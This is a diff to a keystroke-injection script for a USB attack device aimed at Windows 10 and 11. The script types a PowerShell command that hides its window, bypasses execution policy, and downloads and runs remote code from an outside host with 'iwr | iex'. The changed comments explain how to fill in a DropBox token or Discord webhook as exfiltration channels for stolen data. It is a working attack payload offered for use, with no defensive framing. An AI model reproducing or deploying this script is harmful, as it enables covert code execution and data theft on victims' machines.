@@ -8,8 +8,10 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell -noexit -ep bypass $db='';iwr https://jakoby.lol/35k | iex
+STRING powershell -w h -ep bypass $dc='';$db='';iwr https://jakoby.lol/35k | iex
 ENTER
 
-REM     Remember to replace the link with your DropBox shared link for the intended file to download
-REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly
+REM     Fill in either variable or both to set your exfil method.
+REM     $db is the variable that holds your DropBox token.
+REM     $dc is the variable that holds your Discord webhook.   
+REM     If you are using DropBox, also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly.
